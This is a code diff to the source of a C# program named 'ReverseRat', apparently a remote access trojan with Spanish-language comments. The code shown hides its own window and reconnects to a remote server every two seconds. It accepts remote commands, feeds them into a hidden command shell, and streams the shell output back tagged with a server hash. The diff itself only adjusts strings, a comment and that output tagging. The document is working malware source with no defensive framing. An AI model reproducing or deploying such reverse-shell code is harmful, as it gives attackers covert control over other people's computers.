@@ -13,6 +13,7 @@ using System.Net.Sockets;
 using System.IO;            //for Streams
 using System.Diagnostics;   //for Process
 using System.Net;
+using System.Text.RegularExpressions;
 using System.Threading;
 
 namespace ReverseRat
@@ -40,7 +41,7 @@ namespace ReverseRat
             if( !createdNew )
             {
                 // Instance already running; exit.
-                MessageBox.Show("Exiting: Instance already running" );
+                MessageBox.Show(@"Exiting: Instance already running" );
                 Environment.Exit(0);
             }
             InitializeComponent();
@@ -50,9 +51,9 @@ namespace ReverseRat
         {
             this.Hide();
             for (;;)
-            {
+            {               
                 RunServer();
-                System.Threading.Thread.Sleep(2000); //Wait 5 seconds
+                System.Threading.Thread.Sleep(2000); //Wait 2 seconds
             }                                        //then try again
         }
 
@@ -89,7 +90,7 @@ namespace ReverseRat
                     if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer(); // Cierra servidor
                     if (strInput.ToString().LastIndexOf("quit") >= 0) throw new ArgumentException();
                     if (strInput.ToString().LastIndexOf("hola") >= 0) LlamaFuncion.Hola();
-                    if (strInput.ToString().LastIndexOf("prueba") >= 0) EnviaDatos("PRUEBA DE ENVIO DE DATOS");
+                    if (strInput.ToString().LastIndexOf("prueba") >= 0) EnviaDatos("PRUEBA DE ENVIO DE DATOS" + "|" + Funciones.HashServer + "|");
                     if (strInput.ToString().LastIndexOf("asignahash") >= 0)
                     {
                         LlamaFuncion.AgregaHash(strInput.ToString().Split(' ')[1].Trim());
@@ -110,9 +111,7 @@ namespace ReverseRat
                     }
                      
                     if (shell)
-                    {
-                        string cad = "|" + Funciones.HashServer + "|";
-                        processCmd.StandardInput.WriteLine(cad);
+                    {                    
                         processCmd.StandardInput.WriteLine(strInput);                       
                     }
                    // MessageBox.Show(strInput.ToString());
@@ -149,7 +148,7 @@ namespace ReverseRat
             {
                 try
                 {
-                    strOutput.Append(outLine.Data);
+                    strOutput.Append(outLine.Data + "|" + Funciones.HashServer + "|");
                     streamWriter.WriteLine(strOutput);
                     streamWriter.Flush();
                 }
